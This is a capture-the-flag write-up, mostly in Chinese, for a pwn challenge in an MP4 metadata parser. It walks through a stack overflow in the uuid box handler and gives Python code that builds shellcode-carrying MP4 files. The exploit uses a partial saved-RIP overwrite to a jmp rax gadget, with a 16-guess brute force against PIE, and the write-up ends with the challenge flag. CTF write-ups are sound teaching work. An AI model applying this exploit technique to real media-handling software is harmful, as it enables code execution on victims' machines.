# Video Killed the PWN Star Writeup

## 題目描述

My friend Elias is ceaseless watching videos on his phone! So much so that he built a little tool for checking their metadata. What could go wrong?

## 解題思路

1. **第一步**：

    `parse_uuid_raw()` 裡有一個 stack buffer：

    ```c
    char uuid_buffer[BUFFER_SIZE];
    ```

    BUFFER_SIZE：

    ```c
    #define BUFFER_SIZE 256
    ```

    因此只要我們做一個很大的uuid box，就可以讓 `fread()` 把超過 256 bytes 的資料讀進uuid_buffer，造成stack overflow。

2. **第二步**：

    MP4 box的格式：

    ```text
    4 bytes size
    4 bytes type
    payload
    ```

    uuid box的格式：

    ```text
    4 bytes size
    4 bytes "uuid"
    16 bytes UUID
    payload
    ```

    這題程式只會處理UUID等於TARGET_UUID的uuid box：

    ```c
    static const uint8_t TARGET_UUID[16] = {
        0x44, 0x41, 0x4c, 0x43, 0x54, 0x46, 0x32, 0x30,
        0x32, 0x36, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00
    };
    ```

    所以exploit要在正常MP4檔案後面，附加一個符合格式的uuid box，並且把overflow的payload，放在這個box的payload裡。

    Python：

    ```python
    def uuid_box(payload: bytes) -> bytes:
        return struct.pack(">I", 24 + len(payload)) + b"uuid" + target + payload
    ```
    
3. **第三步**：

    根據分析，從 `uuid_buffer` 開始到 saved RIP 的距離是：

    ```python
    offset = 0x118
    ```

    因此payload的順序為：

    ```text
    shellcode
    padding
    partial overwrite saved RIP
    ```

   這題binary有PIE，所以程式的base address會隨機化。

   目標gadget是：

   ```python
   jmp = 0x126f
   ```

   也就是binary裡PIE-relative的：

   ```asm
   jmp rax
   ```

   因此gadget的實際位址會是：

   ```text
   PIE base + 0x126f
   ```

   但是因為PIE開啟，我們不知道完整的PIE base。
   所以這裡使用partial overwrite，只覆蓋saved RIP的低 2 bytes。

   Code：

   ```python
   def make_payload(page_nibble: int) -> bytes:
        low16 = ((page_nibble << 12) + jmp) & 0xffff
        return shell + b"A" * (offset - len(shell)) + struct.pack("<H", low16)
   ```

   最後的：

   ```python
   struct.pack("<H", low16)
   ```

   只會覆蓋saved RIP的低 16 bits。

   因為PIE base是page-aligned，所以base address的低 12 bits固定是0x000，所以真正不確定的部分只剩下 4 bits：

   ```text
   0x0000
   0x1000
   0x2000
   ...
   0xf000
   ```

   暴力破解16種可能：

   ```python
   for guess in range(16):
        data = base + uuid_box(make_payload(guess))
        out = outdir / f"pwn_{guess:x}.mp4"
        out.write_bytes(data)
        print(f"wrote {out} ({len(data)} bytes), ret low16=0x{((guess << 12) + jmp) & 0xffff:04x}")
   ```

   每一個產生出來的MP4檔案，都會嘗試把return address的低 2 bytes改成其中一種可能的jmp rax位址。


4. **第四步**：

   當 `parse_uuid_raw()` 呼叫 `fread()` 時，payload會被讀進stack上的uuid_buffer。

   exploit利用overflow蓋到saved RIP，但只改掉saved RIP的低 2 bytes，讓函式return時跳到jmp rax。

   再從jmp rax跳回在buffer裡的shellcode(因為rax會指向uuid_buffer)，就可以拿flag了。

   全部流程：

   ```text
   uuid_buffer 開頭放 shellcode
   → fread() 把 payload 讀進 uuid_buffer
   → overflow 蓋到 saved RIP 的低 2 bytes
   → saved RIP 被改到 jmp rax gadget
   → parse_uuid_raw() return
   → 程式執行 jmp rax
   → rax 指向 payload / uuid_buffer 附近
   → jmp rax 跳回 shellcode
   → shellcode 執行 open/read/write
   → 印出 /flag.txt
   ```

## Flag

```text
dalctf{s0rry_f0r_th3_d3c3pt10n}
```
